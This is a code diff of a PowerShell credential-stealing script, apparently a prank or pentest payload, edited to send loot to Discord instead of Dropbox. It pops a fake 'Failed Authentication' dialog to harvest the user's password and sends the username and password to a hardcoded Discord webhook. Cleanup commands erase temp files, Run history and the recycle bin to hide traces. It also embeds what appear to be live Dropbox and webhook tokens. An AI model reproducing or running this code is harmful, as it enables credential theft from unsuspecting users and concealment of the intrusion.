@@ -32,6 +32,8 @@
 
 #>
 
+#EDITED BY SOPHIA SPANER, CHANGED DROPBOX TO DISCORD
+
 #------------------------------------------------------------------------------------------------------------------------------------
 
 $DropBoxAccessToken = "sl.BwozIjizznj0JocjQ7Wa8lHfE5iPPU1dMYcOSm7X8T6qOTHKi_XbRzvziCNj_X4E1PAi2n4faR0iy4aCcF-V1v1op1BjLQ002_YWibFpbt6CnK0y3Jr00mEV45FLuYcD35IJOcyFsZl3"
@@ -55,7 +57,10 @@ $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::U
     [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
     Get-Creds
 }
-$creds = $cred.GetNetworkCredential() | fl
+$password = $cred.GetNetworkCredential() | fl
+
+$username = $($cred.Username)
+$creds = "{0} {1}" -f $password, $username
 return $creds
   # ...
 
@@ -121,33 +126,23 @@ Add-Type -AssemblyName System.Windows.Forms
 
 $creds = Get-Creds
 
-#------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to save the gathered credentials to a file in the temp directory
-#>
-
-echo $creds >> $env:TMP\$FileName
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
 <#
 
 .NOTES 
 	This is to upload your files to dropbox
 #>
 
-$TargetFilePath="/$FileName"
-$SourceFilePath="$env:TMP\$FileName"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
+# Create a message with the file attachment
+$message = @{
+    content = "New credentials file uploaded: $creds"
+}
+
+# Convert message to JSON
+$messageJson = $message | ConvertTo-Json
+
+# Send message with the file attachment to Discord webhook
+Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1213302044463595540/83yuwuv9NP--2PXjOQR7iOJhJ8dUUFbuhBTO7AnJVFo-EeVvFGwuDLTec59DAJwFM3sO" -Method Post -ContentType "application/json" -Body $messageJson
+
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -165,11 +160,8 @@ rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Deletes contents of recycle bin
 
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
+ 
